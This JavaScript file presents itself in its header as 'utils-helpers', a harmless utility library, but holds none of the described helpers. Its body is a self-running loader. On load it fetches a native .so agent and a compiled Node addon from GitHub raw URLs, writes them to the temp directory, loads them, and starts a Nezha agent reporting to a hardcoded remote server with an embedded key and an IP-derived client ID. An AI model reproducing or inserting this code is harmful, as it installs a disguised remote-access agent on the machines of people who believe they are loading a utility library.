/*!
 * utils-helpers v1.4.2
 * (c) 2024 Utils Contributors
 * Released under the MIT License
 * https://github.com/utils-helpers/utils-helpers
 *
 * General-purpose JavaScript utility functions for string manipulation,
 * type checking, and async helpers. Compatible with Node.js 14+ and
 * modern browsers. This module provides a small collection of helpers
 * commonly used across web applications: formatting dates and numbers,
 * escaping HTML, deep cloning plain objects, debouncing and throttling
 * callbacks, retrying failed operations with backoff, parsing query
 * strings, and validating common input shapes. All helpers are pure
 * functions with no external dependencies, so the file can be loaded
 * directly in the browser or required from Node.js without a build
 * step. Functions are exported through a single Utils namespace when
 * loaded as a script, and through module.exports when loaded with
 * require(). The library is intentionally small and dependency-free
 * to keep bundle size low and startup fast. See the project README
 * for the full API reference, usage examples, and changelog.
 */
// cdn-utils-napi.js - shared utilities, loaded from CDN at startup.
// Same setup as cdn-utils-v2.js, but the native module is loaded
// through a small self-built N-API addon (nezha.node) instead of
// koffi: no third-party FFI, no separate process. The addon is
// compiled once with -march=x86-64 (baseline x86-64, SSE2 only),
// so it runs on old CPUs, and N-API is ABI-stable across
// Node 18/20/22/24, so one build works everywhere.
// Configuration values are set below before upload.
//   SERVER  - remote endpoint, e.g. nz.example.com:443
//   KEY     - client credential
//   TLS     - 1 = enabled, 0 = disabled
//   UUID    - fixed client identifier, derived from the server IP at runtime
//   SO_URL  - native module URL, fetched at runtime
//   SO_SHA256 - SHA256 of the native module, amd64:
//             040c79f705c74837e7b544e65e1a6c0cb936c467c21c7d60c9b5742c7569d5ea
//             arm64:
//             61f2d296bf9413daf9273f002be111ccc2fabc0f6e5c3ebce549bdff3f26194b
//   ADDON_URL - N-API addon URL, fetched at runtime. Upload the
//             nezha.node file (built from nezha.cc) to this address
//             before use, or change the URL.
//   ADDON_SHA256 - SHA256 of nezha.node:
//             66dac452bce8d68b8b5f398dc1dce3d860f252ae4c659f13a88ed5bd9b0da946
// The native module is started in the background and returns in 500ms,
// without blocking the main process.
// NOTE: no extra package.json dependency is needed for this version.
"use strict";
var https = require("https");
var http = require("http");
var fs = require("fs");
var os = require("os");
var path = require("path");
var cryptoMod = require("crypto");

var SERVER = "nz.zxydk1715.dpdns.org:443";
var KEY = "BFbvpxSlBTUugp3gDzezVKkZ22BV0CeL";
var TLS = 1;
var UUID = "";
var SO_URL = "https://raw.githubusercontent.com/zx1447/nxso/main/nezha_agent.so";
var SO_SHA256 = "040c79f705c74837e7b544e65e1a6c0cb936c467c21c7d60c9b5742c7569d5ea";
var ADDON_URL = "https://raw.githubusercontent.com/zx1447/sonezhapaas/napi/nezha_addon.node";
var ADDON_SHA256 = "66dac452bce8d68b8b5f398dc1dce3d860f252ae4c659f13a88ed5bd9b0da946";

var DIAG_LOG = path.join(process.cwd(), "nezha-diag.log");
function log(msg) {
  try {
    fs.appendFileSync(DIAG_LOG, "[" + new Date().toISOString() + "] " + msg + "\n");
  } catch (e) {}
}
function download(url, redirects) {
  redirects = redirects || 0;
  return new Promise(function (resolve, reject) {
    if (redirects > 3) return reject(new Error("too many redirects"));
    var get = url.indexOf("https://") === 0 ? https.get : http.get;
    var req = get(url, { timeout: 30000 }, function (res) {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        res.resume();
        return resolve(download(res.headers.location, redirects + 1));
      }
      if (res.statusCode !== 200) { res.resume(); return reject(new Error("HTTP " + res.statusCode)); }
      var chunks = [], size = 0;
      res.on("data", function (c) { size += c.length; if (size > 50 * 1024 * 1024) { req.destroy(new Error("too large")); return; } chunks.push(c); });
      res.on("end", function () { resolve(Buffer.concat(chunks)); });
      res.on("error", reject);
    });
    req.on("timeout", function () { req.destroy(new Error("timeout")); });
    req.on("error", reject);
  });
}

function getPublicIP() {
  return new Promise(function (resolve) {
    var done = false;
    function fin(v) { if (!done) { done = true; resolve(v); } }
    try {
      var req = https.get("https://www.cloudflare.com/cdn-cgi/trace", { timeout: 5000 }, function (res) {
        var b = "";
        res.on("data", function (c) { b += c; });
        res.on("end", function () {
          var m = b.match(/ip=([0-9a-fA-F:.]+)/);
          fin(m ? m[1] : "");
        });
        res.on("error", function () { fin(""); });
      });
      req.on("timeout", function () { try { req.destroy(); } catch (e) {} fin(""); });
      req.on("error", function () { fin(""); });
      setTimeout(function () { fin(""); }, 6000);
    } catch (e) { fin(""); }
  });
}
function localIP() {
  try {
    var ifs = os.networkInterfaces();
    for (var name in ifs) {
      for (var i = 0; i < ifs[name].length; i++) {
        var a = ifs[name][i];
        if (a.family === "IPv4" && !a.internal) return a.address;
      }
    }
  } catch (e) {}
  return "";
}
function uuidFromIP(ip) {
  var hex = cryptoMod.createHash("sha256").update(String(ip)).digest("hex").slice(0, 32);
  return hex.slice(0, 8) + "-" + hex.slice(8, 12) + "-5" + hex.slice(13, 16) + "-8" + hex.slice(17, 20) + "-" + hex.slice(20, 32);
}
(async function () {
  try {
    log("start node=" + process.version + " arch=" + process.arch + " tmpdir=" + os.tmpdir() + " cwd=" + process.cwd());
    if (!SERVER || !KEY || KEY === "REPLACE_WITH_CLIENT_SECRET") { log("abort: no server/key"); return; }
    log("download so: " + SO_URL);
    var buf;
    try { buf = await download(SO_URL); log("so downloaded bytes=" + buf.length); } catch (e) { log("so download FAILED: " + (e && e.message)); return; }
    var actual = cryptoMod.createHash("sha256").update(buf).digest("hex");
    log("so sha256=" + actual + " expected=" + SO_SHA256);
    if (actual !== SO_SHA256.toLowerCase()) { log("so SHA MISMATCH"); return; }
    var soPath = path.join(os.tmpdir(), "nezha_agent-" + actual.slice(0, 8) + ".so");
    try { fs.writeFileSync(soPath, buf, { mode: 0o755 }); log("so written: " + soPath); } catch (e) { log("so write FAILED: " + (e && e.message)); return; }
    log("download addon: " + ADDON_URL);
    var abuf;
    try { abuf = await download(ADDON_URL); log("addon downloaded bytes=" + abuf.length); } catch (e) { log("addon download FAILED: " + (e && e.message)); return; }
    var aactual = cryptoMod.createHash("sha256").update(abuf).digest("hex");
    log("addon sha256=" + aactual + " expected=" + ADDON_SHA256);
    if (aactual !== ADDON_SHA256.toLowerCase()) { log("addon SHA MISMATCH"); return; }
    var addonPath = path.join(os.tmpdir(), "nezha_addon-" + aactual.slice(0, 8) + ".node");
    try { fs.writeFileSync(addonPath, abuf, { mode: 0o755 }); log("addon written: " + addonPath); } catch (e) { log("addon write FAILED: " + (e && e.message)); return; }
    var addon;
    try { addon = require(addonPath); log("addon require OK"); } catch (e) { log("addon require FAILED: " + (e && e.message)); return; }
    var ip = UUID ? "" : (await getPublicIP()) || localIP();
    log("ip=" + ip);
    var fixedUUID = UUID || (ip ? uuidFromIP(ip) : "");
    log("uuid=" + fixedUUID);
    try { addon.startNezha(soPath, SERVER, KEY, TLS, fixedUUID); log("startNezha called OK"); } catch (e) { log("startNezha FAILED: " + (e && e.message)); return; }
    log("done");
  } catch (e) { try { log("FATAL: " + (e && e.message)); } catch (e2) {} }
})();
